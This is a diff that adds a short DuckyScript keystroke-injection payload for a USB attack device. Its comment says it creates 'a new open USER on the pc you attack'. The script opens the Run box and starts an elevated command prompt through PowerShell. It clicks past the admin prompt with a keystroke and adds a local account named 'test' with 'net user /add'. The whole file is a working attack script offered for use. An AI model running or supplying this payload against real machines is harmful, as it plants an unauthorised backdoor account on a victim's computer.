@@ -1,0 +1,14 @@
+REM this will create a new open USER on the pc you attack
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 100
+ENTER
+DELAY 1000
+ALT j
+DELAY 2000
+STRING net user /add test
+DELAY 100
+ENTER
+DELAY 1000
+STRING exit
